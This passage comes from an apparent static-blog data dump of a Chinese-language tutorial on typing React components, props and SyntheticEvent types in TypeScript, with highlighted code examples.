class=\"headerlink\" title=\"事件类型\"></a>事件类型</h2><p><code>@types/react</code>提供了各种事件的类型，比如以下是使用<code>React.FormEvent</code>的例子：</p>\n<figure class=\"highlight tsx hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">class</span> <span class=\"title class_\">App</span> <span class=\"hljs-keyword\">extends</span> <span class=\"title class_ inherited__\">React.Component</span>&lt;</span><br><span class=\"line\">  {},</span><br><span class=\"line\">  {</span><br><span class=\"line\">    <span class=\"hljs-attr\">text</span>: <span class=\"hljs-built_in\">string</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">&gt; {</span><br><span class=\"line\">  state = {</span><br><span class=\"line\">    <span class=\"hljs-attr\">text</span>: <span class=\"hljs-string\">''</span>,</span><br><span class=\"line\">  }</span><br><span class=\"line\">  onChange = (<span class=\"hljs-attr\">e</span>: <span class=\"title class_\">React</span>.<span class=\"hljs-property\">FormEvent</span>&lt;<span class=\"title class_\">HTMLInputElement</span>&gt;): <span class=\"hljs-function\"><span class=\"hljs-params\">void</span> =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"title function_\">setState</span>({ <span class=\"hljs-attr\">text</span>: e.<span class=\"hljs-property\">currentTarget</span>.<span class=\"hljs-property\">value</span> })</span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"title function_\">render</span>(<span class=\"hljs-params\"></span>) {</span><br><span class=\"line\">    <span class=\"hljs-keyword\">return</span> (</span><br><span class=\"line\">      <span class=\"hljs-language-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"hljs-language-xml\">        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"text\"</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">{this.state.text}</span> <span class=\"hljs-attr\">onChange</span>=<span class=\"hljs-string\">{this.onChange}</span> /&gt;</span></span></span><br><span class=\"line\"><span class=\"hljs-language-xml\">      <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span></span><br><span class=\"line\">    )</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>在React中，所有事件（包括<a href=\"https://reactjs.org/docs/events.html#form-events\">FormEvent</a>、<a href=\"https://reactjs.org/docs/events.html#keyboard-events\">KeyboardEvent</a>、<a href=\"https://reactjs.org/docs/events.html#mouse-events\">MouseEvent</a>等）都是<a href=\"https://reactjs.org/docs/events.html\">SyntheticEvent</a>的子类型。他们在@types/react中定义如下：</p>\n<figure class=\"highlight tsx hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-comment\">// DOM事件的基本属性都定义在这里</span></span><br><span class=\"line\"><span class=\"hljs-keyword\">interface</span> <span class=\"title class_\">BaseSyntheticEvent</span>&lt;E = <span class=\"hljs-built_in\">object</span>, C = <span class=\"hljs-built_in\">any</span>, T = <span class=\"hljs-built_in\">any</span>&gt; {</span><br><span class=\"line\">  <span class=\"hljs-attr\">nativeEvent</span>: E;</span><br><span class=\"line\">  <span class=\"hljs-attr\">currentTarget</span>: C;</span><br><span class=\"line\">  <span class=\"hljs-attr\">target</span>: T;</span><br><span class=\"line\">  <span class=\"hljs-attr\">bubbles</span>: <span class=\"hljs-built_in\">boolean</span>;</span><br><span class=\"line\">  <span class=\"hljs-attr\">cancelable</span>: <span class=\"hljs-built_in\">boolean</span>;</span><br><span class=\"line\">  <span class=\"hljs-attr\">defaultPrevented</span>: <span class=\"hljs-built_in\">boolean</span>;</span><br><span class=\"line\">  <span class=\"hljs-attr\">eventPhase</span>: <span class=\"hljs-built_in\">number</span>;</span><br><span class=\"line\">  <span class=\"hljs-attr\">isTrusted</span>: <span class=\"hljs-built_in\">boolean</span>;</span><br><span class=\"line\">  <span class=\"title function_\">preventDefault</span>(): <span class=\"hljs-built_in\">void</span>;</span><br><span class=\"line\">  <span class=\"title function_\">isDefaultPrevented</span>(): <span class=\"hljs-built_in\">boolean</span>;</span><br><span class=\"line\">  <span class=\"title function_\">stopPropagation</span>(): <span class=\"hljs-built_in\">void</span>;</span><br><span class=\"line\">  <span class=\"title function_\">isPropagationStopped</span>(): <span class=\"hljs-built_in\">boolean</span>;</span><br><span class=\"line\">  <span class=\"title function_\">persist</span>(): <span class=\"hljs-built_in\">void</span>;</span><br><span class=\"line\">  <span class=\"hljs-attr\">timeStamp</span>: <span class=\"hljs-built_in\">number</span>;</span><br><span class=\"line\">  <span class=\"hljs-attr\">type</span>: <span class=\"hljs-built_in\">string</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"hljs-keyword\">interface</span> <span class=\"title class_\">SyntheticEvent</span>&lt;T = <span class=\"title class_\">Element</span>, E = <span class=\"title class_\">Event</span>&gt; <span class=\"hljs-keyword\">extends</span> <span class=\"title class_\">BaseSyntheticEvent</span>&lt;E, <span class=\"title class_\">EventTarget</span> &amp; T, <span class=\"title class_\">EventTarget</span>&gt; {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-comment\">// 具体的事件类型：</span></span><br><span class=\"line\"><span class=\"hljs-keyword\">interface</span> <span class=\"title class_\">FormEvent</span>&lt;T = <span class=\"title class_\">Element</span>&gt; <span class=\"hljs-keyword\">extends</span> <span class=\"title class_\">SyntheticEvent</span>&lt;T&gt; {}</span><br><span class=\"line\"><span class=\"hljs-keyword\">interface</span> <span class=\"title class_\">KeyboardEvent</span>&lt;T = <span class=\"title class_\">Element</span>&gt; <span class=\"hljs-keyword\">extends</span> <span class=\"title class_\">SyntheticEvent</span>&lt;T, <span class=\"title class_\">NativeKeyboardEvent</span>&gt; {</span><br><span class=\"line\">  <span class=\"hljs-attr\">altKey</span>: <span class=\"hljs-built_in\">boolean</span>;</span><br><span class=\"line\">  <span class=\"hljs-comment\">// ...</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"hljs-keyword\">interface</span> <span class=\"title class_\">MouseEvent</span>&lt;T = <span class=\"title class_\">Element</span>, E = <span class=\"title class_\">NativeMouseEvent</span>&gt; <span class=\"hljs-keyword\">extends</span> <span class=\"title class_\">SyntheticEvent</span>&lt;T, E&gt; {</span><br><span class=\"line\">  <span class=\"hljs-attr\">altKey</span>: <span class=\"hljs-built_in\">boolean</span>;</span><br><span class=\"line\">  <span class=\"hljs-comment\">// ...</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"hljs-comment\">// ...</span></span><br></pre></td></tr></tbody></table></figure>\n\n\n\n\n</body></html>","site":{"data":{}},"_categories":[],"_tags":[],"excerpt":"<html><head></head><body><img src=\"/gallery/react+ts.png\" class=\"\">\n<p>TypeScript 是 Javascript 的超集，扩展了 JavaScript 的语法，给 JavaScript 带来了静态类型支持，了解如何在 React 项目中优雅地使用 Typescript，能帮助我们写出更优雅的代码。</p></body></html>","more":"<p>「优雅」的含义：</p>\n<ul>\n<li>减少编写冗余的类型定义、类型标注，充分利用ts的自动类型推断，以及外部提供的类型声明。</li>\n<li>类型安全：提供足够的类型信息来避免运行时错误，让错误暴露在开发期。这些类型信息同时能够提供代码补全、跳转到定义等功能。</li>\n</ul>\n<h2 id=\"组件定义\"><a href=\"#组件定义\" class=\"headerlink\" title=\"组件定义\"></a>组件定义</h2><h3 id=\"函数组件\"><a href=\"#函数组件\" class=\"headerlink\" title=\"函数组件\"></a>函数组件</h3><figure class=\"highlight tsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> * <span class=\"keyword\">as</span> <span class=\"title class_\">React</span> <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react&#x27;</span>;</span><br><span class=\"line\"><span class=\"comment\">// 如果在tsconfig中设置了&quot;allowSyntheticDefaultImports&quot;: true</span></span><br><span class=\"line\"><span class=\"comment\">// 你还可以更精练地import react：</span></span><br><span class=\"line\"><span class=\"comment\">// import React from &quot;react&quot;;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">IProps</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// CSSProperties提供样式声明的类型信息</span></span><br><span class=\"line\">      <span class=\"comment\">// 用户传入style的时候就能够获得类型检查和代码补全</span></span><br><span class=\"line\">      style?: <span class=\"title class_\">React</span>.<span class=\"property\">CSSProperties</span>;</span><br><span class=\"line\">      <span class=\"comment\">// 使用@types/react提供的事件类型定义，这里指定event.target的类型是HTMLButtonElement</span></span><br><span class=\"line\">      <span class=\"title function_\">onClick</span>(<span class=\"attr\">event</span>: <span class=\"title class_\">React</span>.<span class=\"property\">MouseEvent</span>&lt;<span class=\"title class_\">HTMLButtonElement</span>&gt;): <span class=\"built_in\">void</span>;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title class_\">MyComponent</span>: <span class=\"title class_\">React</span>.<span class=\"property\">FC</span>&lt;<span class=\"title class_\">IProps</span>&gt; = <span class=\"function\">(<span class=\"params\">props</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">const</span> &#123; children, ...restProps &#125; = props;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span> &#123;<span class=\"attr\">...restProps</span>&#125;&gt;</span>&#123;children&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>FC是FunctionComponent的缩写。</li>\n<li>IProps无需声明children属性的类型。React.FC会自动为props添加这个属性类型。<br>当然，如果children期望一个render prop，或者期望其他特殊的值，那么你还是要自己给children声明类型，而不是使用默认<br>的React.ReactNode。</li>\n<li>props无需做类型标注。</li>\n</ul>\n<h4 id=\"函数组件defaultProps（Deprecate）\"><a href=\"#函数组件defaultProps（Deprecate）\" class=\"headerlink\" title=\"函数组件defaultProps（Deprecate）\"></a>函数组件defaultProps（Deprecate）</h4><p>如果你需要定义defaultProps，那么不要使用React.FC，因为<a href=\"https://github.com/typescript-cheatsheets/react#typing-defaultprops\">React.FC对defaultProps的支持不是很好</a>：</p>\n<figure class=\"highlight tsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> defaultProps = &#123;</span><br><span class=\"line\">  <span class=\"attr\">who</span>: <span class=\"string\">&quot;Johny Five&quot;</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">IProps</span> = &#123; <span class=\"attr\">age</span>: <span class=\"built_in\">number</span> &#125; &amp; <span class=\"keyword\">typeof</span> defaultProps;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> <span class=\"title function_\">Greet</span> = (<span class=\"params\">props: IProps</span>) =&gt; &#123; <span class=\"keyword\">return</span> <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>123<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span> &#125;;</span><br><span class=\"line\"><span class=\"title class_\">Greet</span>.<span class=\"property\">defaultProps</span> = defaultProps;</span><br></pre></td></tr></table></figure>\n\n<p>事实上，<a href=\"https://github.com/reactjs/rfcs/blob/createlement-rfc/text/0000-create-element-changes.md#deprecate-defaultprops-on-function-components\">一个提议在函数组件中废弃defaultProps的React rfc已经被接受</a>，所以以后还是尽量减少在函数组件上使用defaultProps，使用ES6原生的参数解构+默认参数特性就已经能够满足需要：</p>\n<figure class=\"highlight tsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title class_\">TestFunction</span>: <span class=\"title class_\">FunctionComponent</span>&lt;<span class=\"title class_\">Props</span>&gt; = <span class=\"function\">(<span class=\"params\">&#123; foo = <span class=\"string\">&quot;bar&quot;</span> &#125;</span>) =&gt;</span> <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>&#123;foo&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"类组件\"><a href=\"#类组件\" class=\"headerlink\" title=\"类组件\"></a>类组件</h3><figure class=\"highlight tsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">IProps</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">message</span>: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">IState</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">count</span>: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MyComponent</span> <span class=\"keyword\">extends</span> <span class=\"title class_ inherited__\">React.Component</span>&lt;<span class=\"title class_\">IProps</span>, <span class=\"title class_\">IState</span>&gt; &#123;</span><br><span class=\"line\">  <span class=\"attr\">state</span>: <span class=\"title class_\">IState</span> = &#123;</span><br><span class=\"line\">    <span class=\"comment\">// duplicate IState annotation for better type inference</span></span><br><span class=\"line\">    <span class=\"attr\">count</span>: <span class=\"number\">0</span></span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"title function_\">render</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">        &#123;this.props.message&#125; &#123;this.state.count&#125;</span></span><br><span class=\"line\"><span class=\"language-xml\">      <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>如果你通过声明state属性来初始化state，那么你需要为这个属性增加IState类型标注。虽然这与前面的React.Component&lt;IProps, IState&gt;有重复的嫌疑，但是这两者实际上是不同的：<ul>\n<li>React.Component&lt;IProps, IState&gt;只是标注了基类的state属性类型。</li>\n<li>而当你在子类声明state时，你可以为state标注一个【IState的子类型】作为override。这样，this.state会以子类中的state属性声明作为类型信息的来源。</li>\n</ul>\n</li>\n<li>建议使用函数组件。</li>\n</ul>\n<h2 id=\"可渲染节点类型\"><a href=\"#可渲染节点类型\" class=\"headerlink\" title=\"可渲染节点类型\"></a>可渲染节点类型</h2><p>可渲染节点就是：可以直接被组件渲染函数返回的值。</p>\n<p>与可渲染节点有关的类型定义如下（摘录自[@types/react](<a href=\"https://github.com/DefinitelyTyped/DefinitelyTyped/blob/8a1b68be3a64e5d2aa1070f68cc935d668a976ad/types/react/index.d.ts#L187%EF%BC%89%EF%BC%9A\">https://github.com/DefinitelyTyped/DefinitelyTyped/blob/8a1b68be3a64e5d2aa1070f68cc935d668a976ad/types/react/index.d.ts#L187）：</a></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">ReactText</span> = <span class=\"built_in\">string</span> | <span class=\"built_in\">number</span>;</span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">ReactChild</span> = <span class=\"title class_\">ReactElement</span> | <span class=\"title class_\">ReactText</span>;</span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">ReactNodeArray</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Array</span>&lt;<span class=\"title class_\">ReactNode</span>&gt; &#123;&#125;</span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">ReactFragment</span> = &#123;&#125; | <span class=\"title class_\">ReactNodeArray</span>;</span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">ReactNode</span> = <span class=\"title class_\">ReactChild</span> | <span class=\"title class_\">ReactFragment</span> | <span class=\"title class_\">ReactPortal</span> | <span class=\"built_in\">boolean</span> | <span class=\"literal\">null</span> | <span class=\"literal\">undefined</span>;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"组件类型\"><a href=\"#组件类型\" class=\"headerlink\" title=\"组件类型\"></a>组件类型</h2><ul>\n<li><code>React.FC&lt;Props&gt;</code>（即 <code>React.FunctionComponent&lt;Props&gt;</code>）</li>\n<li><code>React.Component&lt;Props, State&gt;</code></li>\n<li><code>React.ComponentType&lt;Props&gt;</code>（即<code>ComponentClass&lt;P&gt; | FunctionComponent&lt;P&gt;</code>）</li>\n</ul>\n<p>在写HOC的时候经常用到。</p>\n<figure class=\"highlight tsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> withState = &lt;P <span class=\"keyword\">extends</span> <span class=\"title class_\">WrappedComponentProps</span>&gt;<span class=\"function\">(<span class=\"params\"></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  WrappedComponent: React.ComponentType&lt;P&gt;,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\"></span>) =&gt;</span> &#123; ...</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"获取并扩展原生元素的props类型\"><a href=\"#获取并扩展原生元素的props类型\" class=\"headerlink\" title=\"获取并扩展原生元素的props类型\"></a>获取并扩展原生元素的props类型</h2><p>比如，以下例子获取并扩展了<code>&lt;button&gt;</code>的props类型：</p>\n<figure class=\"highlight tsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> <span class=\"title function_\">PrimaryButton</span> = (<span class=\"params\"></span></span><br><span class=\"line\"><span class=\"params\">  props: Props &amp; React.HTMLProps&lt;HTMLButtonElement&gt;</span></span><br><span class=\"line\"><span class=\"params\"></span>) =&gt; <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">Button</span> <span class=\"attr\">size</span>=<span class=\"string\">&#123;ButtonSizes.default&#125;</span> &#123;<span class=\"attr\">...props</span>&#125; /&gt;</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>PrimaryButton能够接受所有原生<code>&lt;button&gt;</code>所接受的<code>props</code>。关键在于<code>React.HTMLProps</code>。</p>\n<h2 id=\"获取并扩展第三方组件的props类型\"><a href=\"#获取并扩展第三方组件的props类型\" class=\"headerlink\" title=\"获取并扩展第三方组件的props类型\"></a>获取并扩展第三方组件的props类型</h2><figure class=\"highlight tsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; <span class=\"title class_\">Button</span> &#125; <span class=\"keyword\">from</span> <span class=\"string\">&quot;library&quot;</span>; <span class=\"comment\">// but doesn&#x27;t export ButtonProps! oh no!</span></span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">ButtonProps</span> = <span class=\"title class_\">React</span>.<span class=\"property\">ComponentProps</span>&lt;<span class=\"keyword\">typeof</span> <span class=\"title class_\">Button</span>&gt;; <span class=\"comment\">// no problem! grab your own!</span></span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">AlertButtonProps</span> = <span class=\"title class_\">Omit</span>&lt;<span class=\"title class_\">ButtonProps</span>, <span class=\"string\">&quot;onClick&quot;</span>&gt;; <span class=\"comment\">// modify</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title class_\">AlertButton</span>: <span class=\"title class_\">React</span>.<span class=\"property\">FC</span>&lt;<span class=\"title class_\">AlertButtonProps</span>&gt; = <span class=\"function\"><span class=\"params\">props</span> =&gt;</span> (</span><br><span class=\"line\">  <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">Button</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;()</span> =&gt;</span> alert(&quot;hello&quot;)&#125; &#123;...props&#125; /&gt;</span></span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"事件类型\"><a href=\"#事件类型\" class=\"headerlink\" title=\"事件类型\"></a>事件类型</h2><p><code>@types/react</code>提供了各种事件的类型，比如以下是使用<code>React.FormEvent</code>的例子：</p>\n<figure class=\"highlight tsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">App</span> <span class=\"keyword\">extends</span> <span class=\"title class_ inherited__\">React.Component</span>&lt;</span><br><span class=\"line\">  &#123;&#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"attr\">text</span>: <span class=\"built_in\">string</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&gt; &#123;</span><br><span class=\"line\">  state = &#123;</span><br><span class=\"line\">    <span class=\"attr\">text</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  onChange = (<span class=\"attr\">e</span>: <span class=\"title class_\">React</span>.<span class=\"property\">FormEvent</span>&lt;<span class=\"title class_\">HTMLInputElement</span>&gt;): <span class=\"function\"><span class=\"params\">void</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"title function_\">setState</span>(&#123; <span class=\"attr\">text</span>: e.<span class=\"property\">currentTarget</span>.<span class=\"property\">value</span> &#125;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"title function_\">render</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&#123;this.state.text&#125;</span> <span class=\"attr\">onChange</span>=<span class=\"string\">&#123;this.onChange&#125;</span> /&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">      <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在React中，所有事件（包括<a href=\"https://reactjs.org/docs/events.html#form-events\">FormEvent</a>、<a href=\"https://reactjs.org/docs/events.html#keyboard-events\">KeyboardEvent</a>、<a href=\"https://reactjs.org/docs/events.html#mouse-events\">MouseEvent</a>等）都是<a href=\"https://reactjs.org/docs/events.html\">SyntheticEvent</a>的子类型。他们在@types/react中定义如下：</p>\n<figure class=\"highlight tsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// DOM事件的基本属性都定义在这里</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">BaseSyntheticEvent</span>&lt;E = <span class=\"built_in\">object</span>, C = <span class=\"built_in\">any</span>, T = <span class=\"built_in\">any</span>&gt; &#123;</span><br><span class=\"line\">  <span class=\"attr\">nativeEvent</span>: E;</span><br><span class=\"line\">  <span class=\"attr\">currentTarget</span>: C;</span><br><span class=\"line\">  <span class=\"attr\">target</span>: T;</span><br><span class=\"line\">  <span class=\"attr\">bubbles</span>: <span class=\"built_in\">boolean</span>;</span><br><span class=\"line\">  <span class=\"attr\">cancelable</span>: <span class=\"built_in\">boolean</span>;</span><br><span class=\"line\">  <span class=\"attr\">defaultPrevented</span>: <span class=\"built_in\">boolean</span>;</span><br><span class=\"line\">  <span class=\"attr\">eventPhase</span>: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">  <span class=\"attr\">isTrusted</span>: <span class=\"built_in\">boolean</span>;</span><br><span class=\"line\">  <span class=\"title function_\">preventDefault</span>(): <span class=\"built_in\">void</span>;</span><br><span class=\"line\">  <span class=\"title function_\">isDefaultPrevented</span>(): <span class=\"built_in\">boolean</span>;</span><br><span class=\"line\">  <span class=\"title function_\">stopPropagation</span>(): <span class=\"built_in\">void</span>;</span><br><span class=\"line\">  <span class=\"title function_\">isPropagationStopped</span>(): <span class=\"built_in\">boolean</span>;</span><br><span class=\"line\">  <span class=\"title function_\">persist</span>(): <span class=\"built_in\">void</span>;</span><br><span class=\"line\">  <span class=\"attr\">timeStamp</span>: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">  <span class=\"attr\">type</span>: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title 